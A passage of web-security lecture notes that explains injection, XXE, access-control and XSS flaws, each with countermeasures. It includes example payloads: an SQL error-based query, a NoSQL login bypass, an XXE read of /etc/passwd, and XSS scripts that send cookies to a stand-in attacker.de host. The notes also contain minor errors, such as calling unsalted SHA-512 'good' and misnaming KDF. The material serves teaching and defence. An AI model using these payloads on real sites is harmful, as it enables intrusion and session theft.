+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">SELECT</span> <span class="k">COUNT</span><span class="p">(</span><span class="o">*</span><span class="p">),</span> <span class="n">CONCAT</span><span class="p">((</span><span class="k">SELECT</span> <span class="o">@@</span><span class="k">version</span><span class="p">),</span><span class="mi">0</span><span class="n">x3a</span><span class="p">,</span><span class="n">FLOOR</span><span class="p">(</span><span class="n">RAND</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">))</span> <span class="n">x</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">GROUP</span> <span class="k">BY</span> <span class="n">x</span><span class="p">;</span>
+<span class="o">#</span> <span class="n">Error</span><span class="p">:</span> <span class="n">Duplicate</span> <span class="n">entry</span> <span class="s1">&#39;5.1.73-0ubuntu0.10.04.1:1&#39;</span> <span class="k">for</span> <span class="k">key</span> <span class="s1">&#39;group_key&#39;</span>
+<span class="o">#</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">hydrasky</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">network</span><span class="o">-</span><span class="k">security</span><span class="o">/</span><span class="n">error</span><span class="o">-</span><span class="n">based</span><span class="o">-</span><span class="k">sql</span><span class="o">-</span><span class="n">injection</span><span class="o">-</span><span class="n">attack</span><span class="o">/</span>
+</code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>Time-based blind SQL Injection:</p>
+<p>Abuse injected delays to exfiltrate data</p>
+<p>e.g. construct query that wait 1 second if a table starts with ’A’, &hellip;</p>
+</li>
+</ul>
+<p>Countermeasures</p>
+<ul>
+<li>
+<p>Parameterized queries using bound, typed parameters</p>
+<ul>
+<li>
+<p>Easy to adopt and work in fairly similar ways among most web technologies</p>
+</li>
+<li>
+<p>E.g. Java, .NET, PHP, Perl, Python (Many frameworks support this out of the box)</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-diff" data-lang="diff"><span class="gd">-  cursor.execute(&#34;SELECT * FROM table WHERE name = &#39;&#34; + username + &#34;&#39; and id = &#39;&#34; + userID + &#34;&#39;;&#34;);
+</span><span class="gd"></span><span class="gi">+  cursor.execute(&#34;SELECT * FROM table WHERE name = %s and id = %d&#34;, (name, id))
+</span></code></pre></td></tr></table>
+</div>
+</div></li>
+</ul>
+</li>
+</ul>
+<h6 id="nosql-injection">NoSQL Injection</h6>
+<p>Node.js &amp; MongoDB</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;/user&#39;</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span> 
+    <span class="kd">var</span> <span class="nx">query</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="nx">username</span><span class="o">:</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">username</span><span class="p">,</span>
+        <span class="nx">password</span><span class="o">:</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">password</span> 
+    <span class="p">}</span>
+    <span class="nx">db</span><span class="p">.</span><span class="nx">collection</span><span class="p">(</span><span class="s1">&#39;users&#39;</span><span class="p">).</span>
+        <span class="nx">find</span><span class="p">(</span><span class="nx">query</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">users</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">while</span> <span class="p">(</span><span class="nx">users</span><span class="p">.</span><span class="nx">hasNext</span><span class="p">())</span> <span class="p">{</span> 
+                <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">users</span><span class="p">.</span><span class="nx">next</span><span class="p">());</span>
+            <span class="p">}</span>
+        <span class="p">});</span>    
+ <span class="p">});</span>
+
+
+<span class="nx">POST</span> <span class="nx">http</span><span class="o">:</span><span class="c1">//www.example.com/user HTTP/1.1 
+</span><span class="c1"></span><span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span> <span class="nx">application</span><span class="o">/</span><span class="nx">json</span>
+    <span class="p">{</span>
+        <span class="s2">&#34;username&#34;</span><span class="o">:</span> <span class="p">{</span><span class="s2">&#34;$ne&#34;</span><span class="o">:</span> <span class="kc">null</span><span class="p">},</span> 
+        <span class="s2">&#34;password&#34;</span><span class="o">:</span> <span class="p">{</span><span class="s2">&#34;$ne&#34;</span><span class="o">:</span> <span class="kc">null</span><span class="p">}</span>
+    <span class="p">}</span>
+<span class="c1">// Match user $ne (*not equal) to null =&gt; Output all users and passwords
+</span></code></pre></td></tr></table>
+</div>
+</div><h5 id="1224--broken-authentication-and-session-management">12.2.4  Broken Authentication and Session Management</h5>
+<ul>
+<li>
+<p>Authentication frameworks require prior knowledge (too many options for new users)</p>
+</li>
+<li>
+<p>Building custom authentication and session management correctly is hard</p>
+</li>
+</ul>
+<p>Either way you have to understand how authentication is worked. Building a <strong>custom authentication</strong> requires even more knowledge.</p>
+<h6 id="examples-for-custom-build-authentication">Examples for Custom Build Authentication</h6>
+<ul>
+<li>
+<p>Storing username and password with only read access for the web application  - bad</p>
+</li>
+<li>
+<p>Storing username and hashed password using MD5 - bad</p>
+</li>
+<li>
+<p>Storing username and hashed password using SHA-512 - good</p>
+</li>
+<li>
+<p>Storing username and encrypted password 会得到明文密码 - bad</p>
+</li>
+<li>
+<p>Storing username and hashed password with salt (and pepper) - good</p>
+</li>
+<li>
+<p>Storing username and hashed password using KDF (key distribution function) - good</p>
+</li>
+</ul>
+<h6 id="bad-session-management-examples-url-rewriting">Bad Session Management Examples (URL Rewriting)</h6>
+<ul>
+<li>
+<p>Scenario 1:</p>
+<p>Airline reservations application supports URL rewriting, putting session IDs in the URL: <code>http://example.com/sale/saleitems;jsessionid=2P0OC2JDPXM0OQSNDLPSKHCJUN2JV?dest=Hawaii</code></p>
+<p>An authenticated user of the site wants to let his friends know about the sale. He e-mails the above link without knowing he is also giving away his <mark>session ID</mark>. When his friends use the link they will use his <mark>session and credit card</mark>.</p>
+<img src="file:///Users/rozen/Desktop/ITS/2020SS/3%20IT-Sicherheit/note/img/1593275180572.jpg" title="" alt="1593275180572.jpg" width="543">
+</li>
+<li>
+<p>Scenario 2:</p>
+<p>Insider or external attacker gains access to the system&rsquo;s password database.
+User <strong>passwords are not properly hashed and salted</strong>, exposing every users&rsquo; password
+to the attacker.</p>
+</li>
+</ul>
+<h6 id="bad-session-management-countermeasures">Bad Session Management Countermeasures</h6>
+<ul>
+<li>
+<p>Store <strong>credentials</strong> always protected when using <strong>hashing or encryption</strong></p>
+<ul>
+<li>Credentials: Passwords, session IDs, and other credentials send via SSL/TLS connections</li>
+</ul>
+</li>
+<li>
+<p>Credentials should not be guessed easily or overwritten through weak account management functions</p>
+<ul>
+<li>e.g., same username: account creation, change password, recover password, weak session IDs</li>
+</ul>
+</li>
+<li>
+<p>Never expose session IDs in the URL</p>
+<ul>
+<li>e.g., URL rewriting due to not supported cookies</li>
+</ul>
+</li>
+<li>
+<p>User should have the possibility to <strong>log out</strong></p>
+<ul>
+<li>
+<p>Sessions should <strong>timeout</strong></p>
+</li>
+<li>
+<p>Sessions should <strong>rotate</strong></p>
+</li>
+</ul>
+</li>
+</ul>
+<h6 id="secure-password-recovery-mechanism">Secure Password Recovery Mechanism</h6>
+<p>No industry standard for implementing a <strong>Forgot Password Feature</strong>.</p>
+<p>Instead applications <strong>forcing users to jump through myriad hoops</strong> involving emails, special crafted URLs, temporary passwords, personal security questions, etc.</p>
+<ol>
+<li>
+<p>Gather Identity Data</p>
+<ul>
+<li>
+<p>Ask user for multiple pieces of <strong>hard data</strong> (email, last name, date of birth, account number, etc.)</p>
+</li>
+<li>
+<p>Minimum <strong>three inputs</strong> is recommended</p>
+</li>
+<li>
+<p>Enhanced security: <strong>First ask the email address</strong> and send an email that takes users to a <strong>private page with other requests</strong></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Verify Security Questions</p>
+<ul>
+<li>
+<p>Verify all given answers</p>
+</li>
+<li>
+<p>If incorrect, displays a <strong>generic error message</strong></p>
+</li>
+<li>
+<p><strong>Avoid sending the username as a parameter</strong> (hidden or otherwise) when the form on this page is submitted</p>
+</li>
+<li>
+<p>Username should be stored in the server-side session where it can be
+retrieved as needed</p>
+</li>
+</ul>
+</li>
+<li>
+<p>Send a Token over a Side-Channel</p>
+<ul>
+<li>
+<p>Email or SMS the user a <strong>randomly-generated code</strong> having 8 or more characters</p>
+<p>This introduces an &ldquo;<strong>out of band</strong>&rdquo; communication channel is extremely
+tough for a hacker to overcome</p>
+</li>
+<li>
+<p>In some scenarios not feasible.</p>
+</li>
+</ul>
+</li>
+<li>
+<p>Allow user to change password</p>
+<ul>
+<li>
+<p>Request input of the code sent in step 3</p>
+</li>
+<li>
+<p>Allow user to reset password</p>
+<ul>
+<li>
+<p><strong>Check if steps 1 and 2 completed correctly</strong></p>
+</li>
+<li>
+<p>Display a form with input fields for the <strong>code, new password, and pw confirmation</strong></p>
+</li>
+<li>
+<p>Verify the correct code</p>
+</li>
+<li>
+<p>Enforce password complexity requirements</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<h5 id="1225-sensitive-data-exposure">12.2.5 Sensitive Data Exposure</h5>
+<p>Attackers typically don&rsquo;t break the crypto:</p>
+<ul>
+<li>Find keys, get clear text copies of data, or access data via channels that automatically decrypt</li>
+</ul>
+<p>Commonly encryption is not used on data that deserves encryption</p>
+<ul>
+<li>Sensitive Data vs. Non-Sensitive Data</li>
+</ul>
+<p>When encryption is in place, it is common to use:</p>
+<ul>
+<li>
+<p>unsafe key generation and storage, no rotating keys, and weak algorithm</p>
+</li>
+<li>
+<p>weak or unsalted hashes to protect passwords</p>
+</li>
+</ul>
+<p>=&gt; Only authorized users should access decrypted copies of the data!</p>
+<h6 id="sensitive-data-exposure-examples">Sensitive Data Exposure Examples</h6>
+<ul>
+<li>
+<p>Scenario 1: A backup tape is made of encrypted health records, but the</p>
+<p>encryption key is on the same backup.</p>
+</li>
+<li>
+<p>Scenario 2: The password database uses <strong>unsalted hashes</strong> to store everyone&rsquo;s passwords. A file upload flaw allows an attacker to retrieve the password file. All the unsalted hashes can be brute forced in 4 weeks, while properly salted hashes would have taken over 3000 years.</p>
+</li>
+<li>
+<p>Scenario 3: Git is used but on deployment the .git is not removed.</p>
+</li>
+</ul>
+<h6 id="sensitive-data-exposure-countermeasures">Sensitive Data Exposure Countermeasures</h6>
+<p>For all sensitive data deserving protection, do all of the following, at a minimum:</p>
+<ul>
+<li>
+<p>Considering the threats you plan to protect this data from</p>
+</li>
+<li>
+<p>Ensure offsite backups are encrypted , but the keys are managed and backed up <strong>separately</strong></p>
+</li>
+<li>
+<p>Ensure appropriate strong standard algorithms and strong keys are used and key management is in place</p>
+</li>
+<li>
+<p>Ensure passwords are hashed with a strong standard algorithm</p>
+</li>
+<li>
+<p>Ensure all keys and passwords are protected from unauthorized access</p>
+</li>
+</ul>
+<h5 id="1226-xml-external-entities-xxe">12.2.6 XML External Entities (XXE)</h5>
+<p>Vulnerable targets are applications that:</p>
+<ul>
+<li>
+<p>accept user XML input</p>
+</li>
+<li>
+<p>don&rsquo;t use restrict parser options 不限制解析器</p>
+</li>
+</ul>
+<p>Simple XML Example (server outputs a given name):</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-http" data-lang="http"><span class="err">POST http://www.example.com/user HTTP/1.1 
+</span><span class="err">Content-Type: application/xml
+</span><span class="err">    &lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;
+</span><span class="err">    &lt;name&gt;Carl&lt;/name&gt;
+</span><span class="err">and the server will reply with
+</span><span class="err">Hello Carl!
+</span></code></pre></td></tr></table>
+</div>
+</div><h6 id="what-are-xml-entities">What are XML Entities?</h6>
+<p>Entities define content with entity names that are:</p>
+<ul>
+<li>
+<p>shorter than the content</p>
+</li>
+<li>
+<p>easier to type</p>
+</li>
+</ul>
+<p>Common entities are:</p>
+<ul>
+<li>
+<p>&amp;#nnnn; – where nnnn is the Unicode number of a character (e.g. ☺ for ☺)</p>
+</li>
+<li>
+<p>&amp;xhhhh; – where hhhh is the Hexadecimal Unicode of a character (e.g. ☺ for ☺)</p>
+</li>
+<li>
+<p>Named entities like:</p>
+<ul>
+<li>
+<p><code>&amp;nbsp;</code> (no breaking space)</p>
+</li>
+<li>
+<p><code>&amp;szlig;</code> (ß)</p>
+</li>
+<li>
+<p><code>&amp;Auml;</code> (Ä)</p>
+</li>
+<li>
+<p><code>&amp;ouml;</code> (ö)</p>
+</li>
+<li>
+<p><code>&amp;amp; </code>(&amp;)</p>
+</li>
+</ul>
+</li>
+</ul>
+<p>You can define your own entities</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-xml" data-lang="xml"><span class="cp">&lt;?xml version=&#34;1.0&#34;?&gt;</span> 
+<span class="cp">&lt;!DOCTYPE student [
+</span><span class="cp">    &lt;!ELEMENT student (name,mail)&gt;</span> 
+    <span class="cp">&lt;!ELEMENT name (#PCDATA)&gt;</span>
+    <span class="cp">&lt;!ELEMENT mail (#PCDATA)&gt;</span>
+    <span class="cp">&lt;!ENTITY &amp;tu; &#34;@stud.tu-darmstadt.de&#34;&gt;</span>
+]&gt; 
+<span class="nt">&lt;student&gt;</span>
+    <span class="nt">&lt;name&gt;</span>Pallas Athene<span class="nt">&lt;/name&gt;</span>
+    <span class="nt">&lt;mail&gt;</span>pallas.athene<span class="ni">&amp;tu;</span><span class="nt">&lt;/mail&gt;</span>
+<span class="nt">&lt;/student&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>You can also use external entities</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-xml" data-lang="xml"><span class="cp">&lt;?xml version=&#34;1.0&#34;?&gt;</span> 
+<span class="cp">&lt;!DOCTYPE software [
+</span><span class="cp">    &lt;!ELEMENT software (name,license)&gt;</span>
+    <span class="cp">&lt;!ELEMENT name (#PCDATA)&gt;</span>
+    <span class="cp">&lt;!ELEMENT license (#PCDATA)&gt;</span>
+    <span class="cp">&lt;!ENTITY &amp;bsd; SYSTEM ”file://bsd.license&#34;&gt;</span> 
+    <span class="cp">&lt;!ENTITY &amp;gpl; SYSTEM ”file://gpl.license&#34;&gt;</span>
+]&gt;
+<span class="nt">&lt;software&gt;</span>
+    <span class="nt">&lt;name&gt;</span>RSA Factorizer<span class="nt">&lt;/name&gt;</span>
+    <span class="nt">&lt;license&gt;</span><span class="ni">&amp;bsd;</span><span class="nt">&lt;/license&gt;</span>
+<span class="nt">&lt;/software&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>XML External Entities Attack</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-http" data-lang="http"><span class="err">POST http://www.example.com/user HTTP/1.1 
+</span><span class="err">Content-Type: application/xml
+</span><span class="err">    &lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt; 
+</span><span class="err">    &lt;!DOCTYPE test [
+</span><span class="err">        &lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt; 
+</span><span class="err">    ]&gt;
+</span><span class="err">    &lt;name&gt;&amp;xxe;&lt;/name&gt;
+</span><span class="err">
+</span><span class="err">// This will output the /etc/passwd of the server instead of the name:
+</span><span class="err">// Hello nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false 
+</span><span class="err">// root:*:0:0:System Administrator:/var/root:/bin/sh 
+</span><span class="err">// daemon:*:1:1:System Services:/var/root:/usr/bin/false ...
+</span></code></pre></td></tr></table>
+</div>
+</div><h6 id="xml-external-entities-countermeasures">XML External Entities Countermeasures</h6>
+<ol>
+<li>
+<p>Use less complex data structures like JSON</p>
+</li>
+<li>
+<p>Disable external entities</p>
+</li>
+<li>
+<p>Whitelisting</p>
+</li>
+</ol>
+<h5 id="1227-broken-access-control">12.2.7 Broken Access Control</h5>
+<h6 id="broken-access-control">Broken Access Control</h6>
+<ul>
+<li>
+<p>Applications frequently use the actual name or key of an object when generating web pages.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">index.php?forward=profile&amp;user=jack
+</code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>Applications do not always verify the user is authorized for the target object.</p>
+</li>
+<li>
+<p>Is user John allowed to access Jack&rsquo;s profile page? =&gt; This results in an insecure <strong>direct object reference flaw</strong>.</p>
+</li>
+</ul>
+<h6 id="broken-access-control-example">Broken Access Control Example</h6>
+<ol>
+<li>An application uses unverified data in a SQL call that is accessing account information:</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">accounts</span> <span class="k">WHERE</span> <span class="n">account</span> <span class="o">=</span> <span class="s2">&#34;$acct&#34;</span> <span class="p">(</span><span class="n">simplified</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>
+<p>Does not matter whether prepared statements are used or not.</p>
+</li>
+<li>
+<p>An attacker modifies the &lsquo;acct&rsquo; parameter =&gt; If not verified, the attacker can access any user&rsquo;s account</p>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">http://example.com/app/accountInfo?acct=notmyacct
+</code></pre></td></tr></table>
+</div>
+</div><ol start="2">
+<li>
+<p>Real world example:</p>
+<p>Libri (in 2009) generated e-mails with links for user invoices. However user authentication was not used and invoice number were iterateable.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">http://www.libri.de/shop/action/account/invoiceDownload?invoiceId=9
+</code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>Senario: The attacker simply force browses to target URLs. The following URLs require authentication. Admin rights are also required for access to the <code>admin_getappInfo</code> page.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">http://example.com/app/getappInfo 
+http://example.com/app/admin_getappInfo
+</code></pre></td></tr></table>
+</div>
+</div><p>If an unauthenticated user can access either page, that&rsquo;s a flaw.</p>
+<p>If an authenticated, non-admin, user is allowed to access the <code>admin_getappInfo</code> page, this is also a flaw, and may lead the attacker to more improperly protected admin pages.</p>
+</li>
+</ol>
+<h6 id="broken-access-control-countermeasures">Broken Access Control Countermeasures</h6>
+<ul>
+<li>
+<p>Use per user or session indirect object references.</p>
+</li>
+<li>
+<p>Check access control if user is authorized</p>
+</li>
+<li>
+<p>Deny all access by default</p>
+</li>
+</ul>
+<h5 id="1228-security-misconfiguration">12.2.8 Security Misconfiguration</h5>
+<h6 id="security-misconfiguration">Security Misconfiguration</h6>
+<ul>
+<li>
+<p>Security misconfiguration can happen <strong>at any level of an application stack</strong>, including the platform, web server, application server, database, framework, and custom code.</p>
+</li>
+<li>
+<p>Developers and system administrators need to work together to ensure that the entire stack is configured properly.</p>
+</li>
+<li>
+<p><strong>Automated scanners</strong> are useful for detecting <u>missing patches</u>, <u>misconfigurations</u>, use of <u>default accounts</u>, <u>unnecessary services</u>, etc.</p>
+</li>
+</ul>
+<h6 id="security-misconfiguration-example">Security Misconfiguration Example</h6>
+<ol>
+<li>
+<p>The app server admin console is automatically installed and not removed. Default accounts aren&rsquo;t changed.</p>
+</li>
+<li>
+<p>Directory listing is not disabled on your server.</p>
+</li>
+<li>
+<p>App server configuration allows <strong>stack traces</strong> to be returned to users.</p>
+</li>
+<li>
+<p>App server comes with sample applications that are not removed from your production server.</p>
+</li>
+</ol>
+<h6 id="security-misconfiguration-countermeasures">Security Misconfiguration Countermeasures</h6>
+<p>The primary recommendations are to establish all of the following:</p>
+<ul>
+<li>
+<p>A repeatable hardening process that makes it fast and easy to deploy another environment that is properly locked down.</p>
+<ul>
+<li>Development, test, and production environments should all be configured identically. This process should be automated to minimize the effort required to setup a new secure environment.</li>
+</ul>
+</li>
+<li>
+<p>A process deploying all <u>new software updates</u> and <u>patches</u> in a timely manner to each deployed environment. This needs to <u>include all code libraries</u> as well.</p>
+</li>
+<li>
+<p>Consider running <u>scans</u> and doing <u>audits periodically</u> to help detect <u>future misconfigurations</u> or <u>missing patches</u>.</p>
+</li>
+</ul>
+<h5 id="1229-cross-site-scripting-xss">12.2.9 Cross-Site Scripting (XSS)</h5>
+<p>Occurs when a web application <strong>interprets (malicious) data</strong> from a user, using JavaScript, VBScript, ActiveX, TypeScript, &hellip;</p>
+<p>Threats:</p>
+<ul>
+<li>
+<p>account hijacking</p>
+</li>
+<li>
+<p>changing of user settings</p>
+</li>
+<li>
+<p>cookie theft/poisoning</p>
+</li>
+<li>
+<p>redirecting or way worse!</p>
+</li>
+</ul>
+<p>Main Objective: Modify behavior of original site</p>
+<ul>
+<li>
+<p><code>&lt;Script&gt;</code> Different languages (e.g. JS)</p>
+</li>
+<li>
+<p><code>&lt;Object&gt;</code> Applet, Media, ActiveX</p>
+</li>
+<li>
+<p><code>&lt;Applet&gt;</code> Applet, deprecated</p>
+</li>
+<li>
+<p><code>&lt;Embed&gt;</code> Embedding Media</p>
+</li>
+<li>
+<p><code>&lt;Form&gt;</code> Forms</p>
+</li>
+</ul>
+<h6 id="javascript-introduction">JavaScript Introduction</h6>
+<p>Language executed by client browser:</p>
+<ul>
+<li>
+<p><strong>Scripts are embedded</strong> in Web pages</p>
+</li>
+<li>
+<p>Can run before HTML is loaded, <mark>before</mark> page is viewed, <mark>while</mark> it is being viewed or <mark>when leaving</mark> the page.</p>
+</li>
+</ul>
+<p>Attacker gets to execute code on user&rsquo;s machine</p>
+<ul>
+<li>Often used to <strong>exploit other vulnerabilities</strong></li>
+</ul>
+<p>Common usage of JavaScript:</p>
+<ul>
+<li>
+<p>Form validation, page visualizations and special effects, navigation systems, basic math calculations, dynamic content manipulation</p>
+</li>
+<li>
+<p>Hundreds of applications:  Dashboard widgets in Mac OS X, Google Maps, Philips universal remotes&hellip;</p>
+</li>
+</ul>
+<h6 id="javascript-security-model">JavaScript Security Model</h6>
+<ol start="0">
+<li>
+<p>Script runs in a &ldquo;sandbox&rdquo;</p>
+<ul>
+<li>No direct file access, restricted network access</li>
+</ul>
+</li>
+<li>
+<p>Same-origin policy (<strong>SOP</strong>)</p>
+<ul>
+<li>
+<p>Can only read properties of documents and windows from the same <u>server</u>, <u>protocol</u>, and <u>port</u></p>
+</li>
+<li>
+<p>If the same server hosts unrelated sites, scripts from one site can access document properties on the other</p>
+</li>
+<li>
+<p>More detailed in browser security part</p>
+</li>
+</ul>
+<p>Same-origin policy does <strong>not</strong> apply to <strong>script tags</strong> inserted into the site.</p>
+<p>=&gt; This script runs as if it was loaded from the site that provided the page!</p>
+<p>Same Origin Policy Example</p>
+<img src="file:///Users/rozen/Desktop/ITS/2020SS/3%20IT-Sicherheit/note/img/1593764999506.jpg" title="" alt="1593764999506.jpg" width="603">
+</li>
+</ol>
+<h6 id="cross-site-scripting-xss">Cross Site Scripting (XSS)</h6>
+<p>Attacker injects malicious JavaScript code into a HTML-Page (Form Input / Link / Address bar)</p>
+<ul>
+<li>
+<p>The web server can either save the malicious JavaScript (<mark>Persistent XSS</mark>) or</p>
+<p>the script is executed once by the victim (<mark>Non-Persistent XSS</mark>) (e.g. the malicious script is sent by e-mail).</p>
+</li>
+<li>
+<p>Server doesn&rsquo;t validate the input and creates the requested page</p>
+</li>
+</ul>
+<p>Malicious code will be executed by the client browser</p>
+<ul>
+<li>
+<p>Within the security context of the hosting web site</p>
+</li>
+<li>
+<p>Code has the ability to read, modify and transmit any sensitive data accessible</p>
+</li>
+</ul>
+<hr>
+<p>Persistent (stored) XSS</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="o">&lt;</span><span class="nx">SCRIPT</span><span class="o">&gt;</span> <span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="o">=</span><span class="s1">&#39;http://attacker.de/cgi-bin/cookiesteal.cgi?&#39;</span> <span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span> <span class="o">&lt;</span><span class="err">/SCRIPT&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>
+<p>Attacker injects JavaScript snippet in web application before the user requests it</p>
+</li>
+<li>
+<p>The XSS <strong>is saved</strong> in the web application</p>
+<img src="file:///Users/rozen/Desktop/ITS/2020SS/3%20IT-Sicherheit/note/img/1593769731183.jpg" title="" alt="1593769731183.jpg" width="536">
+</li>
+</ul>
+<hr>
+<p>Non-Persistent XSS</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">http://portal.de/index.php?sessionid=123&amp;username= 
+&lt;script&gt;document.location=&#39;http://attacker.de/cgi-bin/cookiesteal.cgi?&#39;+document.cookie&lt;/script&gt;Attacker sends a prepared URL (without or with logged in user)
+</code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>
+<p>Attacker sends a prepared URL (without or with logged in user)</p>
+</li>
+<li>
+<p>The XSS is not saved in the web application</p>
+<img src="file:///Users/rozen/Desktop/ITS/2020SS/3%20IT-Sicherheit/note/img/1593770310390.jpg" title="" alt="1593770310390.jpg" width="522">
+</li>
+</ul>
+<hr>
+<p>Simple Example</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-html" data-lang="html"><span class="c">&lt;!--victim.com/xss--&gt;</span>
+
+<span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>XSS Demo<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span> 
+    Hello {{ name }}! 
